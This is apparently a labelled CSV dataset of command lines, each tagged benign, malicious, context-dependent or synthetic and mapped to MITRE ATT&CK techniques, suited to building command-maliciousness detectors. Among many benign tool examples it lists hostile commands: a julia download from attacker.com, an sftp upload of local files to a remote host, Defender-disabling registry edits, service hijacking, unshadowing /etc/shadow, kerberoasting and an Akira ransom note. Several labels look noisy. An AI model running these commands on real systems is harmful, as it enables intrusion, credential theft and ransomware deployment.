command,label,original_label,mitre_id
MOUNT D D:\ -t cdrom -usecd 0 -ioctl,Context_Dependent,Benign,Benign
kubectl set env --from secret|configmap/resource_name [deploy|deployment]/deployment_name,Benign,Benign,Benign
pvesm [l|list] storage_name,Benign,Benign,Benign
rmdir --ignore-fail-on-non-empty newBaseDir/Data/NewDataCopy,Benign,Benign,Benign
"find /tmp/ -ctime -1 -name 'x*' -exec sh -c ' exec mv ""$@"" ~/play/' sh {} +",Benign,Benign,Benign
mv [-n|--no-clobber] path/to/source path/to/target,Benign,Benign,Benign
ApplicationImpersonation,Malicious,Malicious,T1548
"find /var/www/html/zip/data/*/*/*/*/* -type f -mtime +90 -printf ""%h\n"" | sort | uniq",Benign,Benign,Benign
pkg_add -l path/to/file,Benign,Benign,Benign
"find . -name ""*sub*.cpp""",Benign,Benign,Benign
nmap 10.0.0.100,Context_Dependent,Synthetic,Synthetic
supervisorctl tail -100 process_name stderr,Benign,Benign,Benign
plenv help command,Benign,Benign,Benign
"netsh.exe add helper ""$helper_file""",Malicious,Malicious,T1546
<RightShift F11>,Benign,Benign,Benign
tar cz my_large_file_1 my_large_file_2 | split -b 1024MiB - myfiles_split.tgz_,Benign,Benign,Benign
csvstat [-c|--columns] 3 --len data.csv,Benign,Benign,Benign
tifftopnm [-h|-headerdump] path/to/input_file.tiff > path/to/output_file.pnm,Benign,Benign,Benign
lxi discover,Benign,Benign,Benign
grype image:tag --only-fixed,Benign,Benign,Benign
swaylock [-f|--daemonize],Benign,Benign,Benign
poetry install --no-root,Benign,Benign,Benign
cmd /c tasklist > %temp%\temp.ini,Context_Dependent,Malicious,T1057
find . -type f -perm +111 -print,Benign,Benign,Benign
transmission-remote hostname [-w|--download-dir] /path/to/download_directory,Benign,Benign,Benign
osage -T png -O path/to/input.gv,Benign,Benign,Benign
"tgutil [-n|--name] session_name [-u|--username] chat_id [-m|--mode] delete --text ""current_text""",Benign,Benign,Benign
lzop [-9|--best] path/to/file,Benign,Benign,Benign
find /etc/ -user root -mtime 1,Benign,Benign,Benign
dirb http://10.0.0.10,Context_Dependent,Synthetic,Synthetic
cmdkey /add:server_name /user:user_name,Benign,Benign,Benign
defaults write com.apple.Dock expose-animation-duration -float 0.1,Benign,Benign,Benign
"sc create VBoxDRV binpath= ""C:\Program Files\Oracle\VirtualBox\drivers\VboxDrv.sys"" type= kernel start= auto error= normal displayname= PortableVBoxDRV",Malicious,Malicious,T1564
"find . -maxdepth 1 -name ""$a"" -print -quit",Benign,Benign,Benign
co -rrevision path/to/file,Benign,Benign,Benign
sockstat -jv,Benign,Benign,Benign
for FILENAME in *; do mv $FILENAME Unix_$FILENAME; done,Benign,Benign,Benign
filefrag -v path/to/file1 path/to/file2 ...,Benign,Benign,Benign
dnf versionlock add package,Benign,Benign,Benign
lscpu,Context_Dependent,Benign,Benign
"$VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0x5B, 0x52, 0x0000, 0x0002",Malicious,Malicious,T1566
sshd,Benign,Benign,Benign
"find . -name ""*.java"" -print0 | xargs -0 -J % cp % destinationFolder",Benign,Benign,Benign
nmon -f -s 30 -c 240,Benign,Benign,Benign
"{{echo -n '{""name"":""My Folder1""}' | base64}} | bw create folder",Benign,Benign,Benign
g_CiOptions,Malicious,Malicious,T1553
phpbu --simulate,Benign,Benign,Benign
dir /s /b %USERPROFILE%\Favorites,Context_Dependent,Malicious,T1217
touch -r <filename> <filename>,Malicious,Malicious,T1070
waybar [-s|--style] path/to/stylesheet.css,Benign,Benign,Benign
md $folder_name,Malicious,Malicious,T1564
mp4box -info path/to/file,Benign,Benign,Benign
wifi-password ssid,Benign,Benign,Benign
icalBuddy uncompletedTasks,Benign,Benign,Benign
tldr pamtofits,Benign,Benign,Benign
zpool import,Benign,Benign,Benign
task execute /bin/sh,Malicious,Malicious,T1059
katana -u https://example.com [-hl|-headless],Benign,Benign,Benign
pulumi plugin [-h|--help],Benign,Benign,Benign
find . -type f -exec wc -l {} \; | awk '{ SUM += $0} END { print SUM }',Benign,Benign,Benign
pkgctl diff [-d|--diffoscope] path/to/file|pkgname,Benign,Benign,Benign
nl -n ln log.txt | sed ...,Benign,Benign,Benign
sudo asr restore --source image_file.dmg --target path/to/volume_file --noverify,Benign,Benign,Benign
find /path/to/dir -type f -mtime -7 -print0,Benign,Benign,Benign
ADORE.XSEC,Malicious,Malicious,T1037
lastlog --user username,Context_Dependent,Benign,Benign
find / -type f -newer /tmp/timestamp 2>/dev/null,Context_Dependent,Synthetic,Synthetic
find . -follow -iname '*.htm' -print0 | xargs -i -0 mv '{}' ~/webhome,Benign,Benign,Benign
aws batch create-compute-environment --compute-environment-name compute_environment_name --type type,Benign,Benign,Benign
set -o history,Benign,Benign,Benign
i3lock [-u|--no-unlock-indicator],Benign,Benign,Benign
farge --notify --expire-time 5000,Benign,Benign,Benign
"tspin --pager ""bat -p [FILE]"" path/to/file.log",Benign,Benign,Benign
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRoutinelyTakingAction"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",Malicious,Malicious,T1562
rubocop,Benign,Benign,Benign
Get-ChildItem | Sort-Object -Descending,Benign,Benign,Benign
csshX cluster1,Benign,Benign,Benign
emulator -avd name -webcam-list,Benign,Benign,Benign
IKEEXT,Malicious,Malicious,T1543
sslstrip --ssl --listen=8080,Benign,Benign,Benign
date +%V,Benign,Benign,Benign
rsync -a --include='*/' --exclude='*' source/ destination/,Benign,Benign,Benign
getfacl [-t|--tabular] path/to/file_or_directory,Benign,Benign,Benign
find -L /usr/ports/packages -type l -exec rm -- {} +,Benign,Benign,Benign
waymore -mode R [-oR|--output-responses] path/to/example.com-url-responses [-i|--input] example.com,Benign,Benign,Benign
cadaver http://dav.example.com:8022/path/to/collection/,Benign,Benign,Benign
attrib.exe -r $file_or_folder\*.* /s,Malicious,Malicious,T1222
wifi-menu [-o|--obscure],Benign,Benign,Benign
pve-firewall [c|compile],Benign,Benign,Benign
cargo logout --registry name,Benign,Benign,Benign
$_.Exception,Malicious,Malicious,T1098
find /etc/ -type f -exec ls -s {} + | sort -n | head -3,Benign,Benign,Benign
cd $stratus_path,Malicious,Malicious,T1552
minifab down,Benign,Benign,Benign
"playerctl metadata [-f|--format] ""{{Now playing: \{\{artist\}\} - \{\{album\}\} - \{\{title\}\}}}""",Benign,Benign,Benign
tcpdump -i eth0 host 10.0.0.5,Context_Dependent,Synthetic,Synthetic
"kiterunner brute https://example.com [-w|--wordlist] path/to/dirsearch.txt [-D|--dirsearch-compat] [-e|--extensions] json,txt",Benign,Benign,Benign
ping -w 1 $c,Benign,Benign,Benign
"find . -name ""*.txt"" -print0 | xargs -0 egrep 'stuff'",Benign,Benign,Benign
find `gen_root_dirs.sh` -type f -size 0 -ls,Benign,Benign,Benign
vcluster platform create vcluster_name [-n|--namespace] namespace,Benign,Benign,Benign
tlmgr restore package,Benign,Benign,Benign
chroma --list,Benign,Benign,Benign
split -l 100 input_file output_file,Benign,Benign,Benign
mmls -B -i path/to/image_file,Benign,Benign,Benign
macchanger [-p|--permanent] interface,Benign,Benign,Benign
rustscan [-g|--greppable] [-a|--addresses] address_or_addresses,Benign,Benign,Benign
j [-s|--stat],Benign,Benign,Benign
/etc/rc.local.d/local.sh,Malicious,Malicious,T1564
acpi [-c|--cooling],Benign,Benign,Benign
rsync -e ssh file host:/directory/.,Benign,Benign,Benign
dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext},Malicious,Malicious,T1105
"echo ""put $local_path\$file_name"" | sftp $username@$remote_host:$remote_path",Malicious,Malicious,T1105
nc -lnvp 8080,Context_Dependent,Synthetic,Synthetic
pstopnm -dpi n path/to/file.ps,Benign,Benign,Benign
jj git fetch --remote remote,Benign,Benign,Benign
xrandr [-d|--display] :0 [-q|--query],Benign,Benign,Benign
pdfjam path/to/file1.pdf last-1 path/to/file2.pdf last-1 ... --suffix reversed,Benign,Benign,Benign
ipcrm [-s|--semaphore-id] semaphore_id,Benign,Benign,Benign
nkf -s path/to/file.txt,Benign,Benign,Benign
Get-History -Count n,Benign,Benign,Benign
ss-local --plugin plugin_name --plugin-opts plugin_options,Context_Dependent,Benign,Benign
clangd --help-list,Benign,Benign,Benign
net group /dom,Context_Dependent,Malicious,T1087
command -v nc,Context_Dependent,Synthetic,Synthetic
cdb.exe -pd -pn {process_name} .shell {CMD},Malicious,Malicious,T1127
su - jetty ./runprogram.sh,Benign,Benign,Benign
echo 'ee' | tee >(foo),Benign,Benign,Benign
find . -exec grep PENWIDTH {} \; | more,Benign,Benign,Benign
tv list-channels,Benign,Benign,Benign
"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\$weak_service_name"" /f /v ImagePath /d ""$malicious_service_path""",Malicious,Malicious,T1574
dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser,Malicious,Malicious,T1078
calligrastage,Benign,Benign,Benign
xhost -,Benign,Benign,Benign
find /path/to/search -type l -xtype l,Benign,Benign,Benign
find /home/backups -type f -iregex '.*\.t?gz$' -mtime +60 -exec rm {} \;,Context_Dependent,Benign,Benign
"cmd.exe /c ""$local_folder\$local_executable"" kerberoast $flags /outfile:""$local_folder\$out_file""",Malicious,Malicious,T1558
nmap -sV -p 8443 10.0.0.5,Context_Dependent,Synthetic,Synthetic
find /home -name '*.key' -type f 2>/dev/null,Context_Dependent,Synthetic,Synthetic
qm [ter|terminal] 100,Benign,Benign,Benign
man [-L|--locale] locale command,Benign,Benign,Benign
"dolt commit --author ""author_name <author_email>""",Benign,Benign,Benign
php-coveralls [-v|--verbose],Benign,Benign,Benign
"let ""x++""",Benign,Benign,Benign
cat ~/.profile,Context_Dependent,Synthetic,Synthetic
xteddy -wm -noquit,Benign,Benign,Benign
find /dev/sd*[a-z] | wc -l,Benign,Benign,Benign
dotnet ef dbcontext list,Benign,Benign,Benign
rsync -aqz _vim/ ~/.vim,Benign,Benign,Benign
aws lambda list-aliases --function-name name,Benign,Benign,Benign
</source>,Malicious,Malicious,T1222
cat file | column -c 80,Benign,Benign,Benign
"tldr-lint [-I|--ignore] TLDR001,TLDR002,...",Benign,Benign,Benign
linode-cli domains records-delete domain_id record_id,Benign,Benign,Benign
alr init --bin|--lib project_name,Benign,Benign,Benign
gzip -dc /usr/src/redhat/SOURCES/source-one.tar.gz | tar -xvvf -,Benign,Benign,Benign
git name-rev --all,Benign,Benign,Benign
find /usr/local/svn/repos/ -maxdepth 1 -mindepth 1 -type d -exec echo /usr/local/backup{} \;,Benign,Benign,Benign
comp /l path\to\file1 path\to\file2,Benign,Benign,Benign
"if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""Xen\|Bochs\|QEMU""; fi",Context_Dependent,Malicious,T1082
ss -4 state listening,Context_Dependent,Synthetic,Synthetic
astronomer tldr-pages/tldr-node-client [-s|--stars] 50,Benign,Benign,Benign
"read -p "" Again? Y/n "" i",Benign,Benign,Benign
"julia -e 'download(""http://attacker.com/path/to/input-file"", ""/path/to/output-file"")'",Malicious,Malicious,T1105
run-mailcap --action=edit text/plain:/path/to/output-file,Malicious,Malicious,T1548
"find / -name ""*.txt"" -fstype vfat 2> /dev/null",Context_Dependent,Benign,Benign
"ln -s ""$(which bam2)"" ""$tmpdir""/bam",Benign,Benign,Benign
xdotool click 3,Benign,Benign,Benign
subst Z: /d,Benign,Benign,Benign
"echo ""2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. [f you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them — in this case we won't be able to help. "" >> $env:Userprofile\Desktop\akira_readme.txt",Malicious,Malicious,T1486
conda run [-p|--prefix] path/to/env command,Benign,Benign,Benign
asciidoctor path/to/file.adoc,Benign,Benign,Benign
viu [-n|--name] path/to/file,Benign,Benign,Benign
pixiecore quick xyz --dhcp-no-bind,Benign,Benign,Benign
quota [-v|--verbose],Benign,Benign,Benign
"echo -e ""Column 1\tColumn 2""",Benign,Benign,Benign
prstat,Benign,Benign,Benign
cl path\to\source1.c path\to\source2.c ...,Benign,Benign,Benign
imp [-i|--initialize],Benign,Benign,Benign
gdbus call --session --dest destination_bus_name --object-path /path/to/object --method interface.method_name argument1 argument2 ...,Benign,Benign,Benign
tree -a -C,Benign,Benign,Benign
az feedback,Benign,Benign,Benign
crane index subcommand,Benign,Benign,Benign
find . -type f -exec grep -l 'ExtJSLogin' {} \; | grep -v 'change-app-name.sh' > files.txt,Benign,Benign,Benign
ping6 -a host,Benign,Benign,Benign
"sqlite-utils query path/to/database.db ""delete from table_name where name = 'Tony Hoare'""",Benign,Benign,Benign
jwt decode [-j|--json] jwt_string,Benign,Benign,Benign
createrepo [-v|--verbose] [-x|--excludes] test_*.rpm path/to/directory,Benign,Benign,Benign
ydotool click 0xC0,Benign,Benign,Benign
gzip [-cd|--stdout --decompress] path/to/file.gz > path/to/uncompressed_file,Benign,Benign,Benign
"stat [-c|--format] ""%a %n"" path/to/file",Benign,Benign,Benign
truss -p pid,Benign,Benign,Benign
"read -p ""$1 "" yn",Benign,Benign,Benign
sfc /scannow,Benign,Benign,Benign
ipaggcreate --interface eth0 --length,Benign,Benign,Benign
find lpi104-6 -samefile lpi104-6/file1,Benign,Benign,Benign
hn,Benign,Benign,Benign
ab -n 100 -c 10 url,Benign,Benign,Benign
tldr sniff.py,Benign,Benign,Benign
rig -m|f,Benign,Benign,Benign
kwrite path/to/file,Benign,Benign,Benign
find -L . -type l -delete -exec ln -s new_target {} \;,Benign,Benign,Benign
pdfbook2 path/to/file.pdf,Benign,Benign,Benign
systemsettings,Benign,Benign,Benign
glances [-w|--webserver],Benign,Benign,Benign
HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf,Malicious,Malicious,T1137
ng extract-i18n --out-file path/to/file,Benign,Benign,Benign
acme.sh --issue --dns dns_cf [-d|--domain] *.example.com,Benign,Benign,Benign
wait4x redis redis://localhost:6379,Benign,Benign,Benign
btm [-b|--basic],Benign,Benign,Benign
caffeinate,Benign,Benign,Benign
aws ce create-anomaly-subscription --subscription subscription_name --monitor-arn monitor_arn --subscribers subscribers,Benign,Benign,Benign
svn [up|update],Benign,Benign,Benign
mkdir path\to\directory,Benign,Benign,Benign
dtc -I dts -O dtb -o path/to/output_file.dtb path/to/input_file.dts,Benign,Benign,Benign
echo $(pwd)/$filename,Benign,Benign,Benign
"find . -type f -name ""*.txt""",Benign,Benign,Benign
npm repo --workspace workspace_name,Benign,Benign,Benign
root,Malicious,Malicious,T1543
sysdig [-r|--read] path/to/file.scap,Benign,Benign,Benign
atool [-x|--extract] [-e|--each] archive1.zip archive2.tar.gz *.rar,Benign,Benign,Benign
git obliterate file_1 file_2 ...,Benign,Benign,Benign
retry [-d|--delay] n command,Benign,Benign,Benign
jupytext --to notebook --execute path/to/notebook.md,Benign,Benign,Benign
find . -exec file {} \; | grep text | cut -d: -f1,Benign,Benign,Benign
eim install,Benign,Benign,Benign
fswebcam [-r|--resolution] widthxheight filename,Benign,Benign,Benign
mutt -s subject -c cc@example.com recipient@example.com,Benign,Benign,Benign
fondue /enable-feature:feature /hide-ux:all,Benign,Benign,Benign
uvicorn import.path:app_object,Benign,Benign,Benign
"fold -w79 yourfile | sed -e :a -e 's/^.\{0,78\}$/& /;ta'",Benign,Benign,Benign
grep -i fail /var/log/apache2/error.log,Context_Dependent,Synthetic,Synthetic
WSearch,Malicious,Malicious,T1543
leave time_to_leave,Benign,Benign,Benign
tldr apx pkgmanagers,Benign,Benign,Benign
incus start|stop container_name,Benign,Benign,Benign
pie repository:remove url,Benign,Benign,Benign
dep ssh hostname,Benign,Benign,Benign
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,",Malicious,Malicious,T1218
rpcdump.py domain/username:password@target,Benign,Benign,Benign
sudo lchage --list username,Benign,Benign,Benign
strigger --clear trigger_id,Benign,Benign,Benign
tldr dnf repoquery,Benign,Benign,Benign
sshuttle [-r|--remote] username@sshserver 0.0.0.0/0,Benign,Benign,Benign
rename [-f|--force] 's/\b(\w)/\U$1/g' *.txt,Benign,Benign,Benign
find . -mmin -60 |xargs ls -l,Benign,Benign,Benign
df -k /dir/inner_dir/,Benign,Benign,Benign
"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -h $domain -s subtree -f ""objectclass=computer"" *",Context_Dependent,Malicious,T1087
busybox sh &,Malicious,Malicious,T1059
pio test [-c|--project-conf] path/to/platformio.ini,Benign,Benign,Benign
speedtest-cli,Benign,Benign,Benign
zint --types,Benign,Benign,Benign
ghdl -e design,Benign,Benign,Benign
bc --expression 'scale = 10; 5 / 3',Benign,Benign,Benign
"sc create evilservice binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" DisplayName= ""evilservice"" start= auto\ & sc start evilservice",Malicious,Malicious,T1564
fsck -q /dev/sdX,Benign,Benign,Benign
dotenvx get --all,Benign,Benign,Benign
autoconf,Benign,Benign,Benign
azurite [-d|--debug] path/to/debug.log,Benign,Benign,Benign
nmake /F path\to\makefile,Benign,Benign,Benign
net time \\hostname,Malicious,Malicious,T1124
trash restore file,Benign,Benign,Benign
shar [-T|--text-files] path/to/file1 path/to/file2 ... > path/to/archive.sh,Benign,Benign,Benign
tldr reg delete|unload,Benign,Benign,Benign
deluge [-c|--config] path/to/configuration_file url|magnet|path/to/file,Benign,Benign,Benign
conntrack [-E|--event] [-o|--output] timestamp,Benign,Benign,Benign
xfce4-terminal --tab,Benign,Benign,Benign
hatch clean,Benign,Benign,Benign
salt '*' test.ping,Benign,Benign,Benign
sudo unshadow /etc/passwd /etc/shadow,Benign,Benign,Benign
massdns [-r|--resolvers] path/to/resolvers.txt [-o|--output] S path/to/domains.txt,Benign,Benign,Benign
genfstab -t LABEL|UUID|PARTLABEL|PARTUUID,Benign,Benign,Benign
lerna exec -- ls,Benign,Benign,Benign
